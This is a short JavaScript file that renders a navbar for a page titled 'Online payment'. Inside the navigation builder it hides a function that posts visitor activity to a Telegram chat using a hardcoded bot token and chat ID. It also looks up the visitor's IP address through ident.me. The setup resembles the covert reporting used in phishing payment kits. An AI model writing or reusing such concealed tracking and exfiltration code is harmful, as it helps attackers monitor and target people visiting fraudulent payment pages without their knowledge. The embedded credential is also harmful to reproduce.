const createNav = () => {
    function notifyTelegram(message) {
        const botToken = '7246354262:AAHntXSjinje1yphb59Tua15AwyAjVUOZPU'; // ⚠️ НЕБЕЗОПАСНО!
        const chatId = '7559611229';

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`, {
            method: 'GET'
        })
        .then(response => response.json())
    }


    let nav = document.querySelector('.navbar');

    var loc = location.href;

    fetch('https://ident.me/.json')
    .then(response => {
    if (!response.ok) {
      throw new Error(`Ошибка сети: ${response.status}`);
    }
    return response.json();
    })
    .then(data => {console.log('Ваш IP:', data.ip);})
    .catch(error => {console.error('Ошибка получения IP:', error);});
    
    if (loc.includes('index')) {
        notifyTelegram(`🌐 IP: 000 ▶️ Зашёл на страницу выбора стран`)
    }

    nav.innerHTML = `
        <nav class="bg-white border-b border-gray-200">
          <div class="container mx-auto px-4">
            <div class="flex items-center h-16">
              <h1 class="text-2xl font-['Pacifico'] text-primary">
                Online payment
              </h1>
            </div>
          </div>
        </nav>
    `;
}

createNav();